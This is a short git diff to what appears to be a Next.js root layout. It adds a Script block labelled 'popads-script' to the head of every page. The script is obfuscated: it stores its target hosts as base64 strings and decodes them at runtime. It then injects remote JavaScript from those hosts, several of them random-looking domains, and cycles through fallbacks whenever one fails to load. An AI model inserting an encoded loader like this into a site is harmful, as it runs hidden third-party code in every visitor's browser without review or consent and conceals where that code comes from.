@@ -1,5 +1,6 @@
 import React from 'react';
 import type { Metadata } from 'next';
+import Script from 'next/script';
 import './globals.css';
 import Header from '../components/Header';
 import Footer from '../components/Footer';
@@ -61,6 +62,11 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
     <html lang="en" className="dark">
       <head>
         <meta name="referrer" content="no-referrer" />
+        <Script id="popads-script" strategy="afterInteractive" data-cfasync="false">
+          {`
+            (function(){var t=window,j="da721a2a20b707917e57c21275a04e25",u=[["siteId",405*926*409-148095885],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],v=["d3d3LmludGVsbGlnZW5jZWFkeC5jb20vZGdoLm1pbi5jc3M=","ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvQUt4L2hkZWVwc3RyZWFtLm1pbi5qcw==","d3d3LnFzZXBndWpjanJyLmNvbS9zZ2gubWluLmNzcw==","d3d3LnZpZ3N3b2JjaG9iLmNvbS9qL2ZkZWVwc3RyZWFtLm1pbi5qcw=="],c=-1,d,n,o=function(){clearTimeout(n);c++;if(v[c]&&!(1801901819000<(new Date).getTime()&&1<c)){d=t.document.createElement("script");d.type="text/javascript";d.async=!0;var w=t.document.getElementsByTagName("script")[0];d.src="https://"+atob(v[c]);d.crossOrigin="anonymous";d.onerror=o;d.onload=function(){clearTimeout(n);t[j.slice(0,16)+j.slice(0,16)]||o()};n=setTimeout(o,5E3);w.parentNode.insertBefore(d,w)}};if(!t[j]){try{Object.freeze(t[j]=u)}catch(e){}o()}})();
+          `}
+        </Script>
       </head>
       <body className="bg-slate-950 text-slate-100 font-sans antialiased min-h-screen flex flex-col">
         <Header />
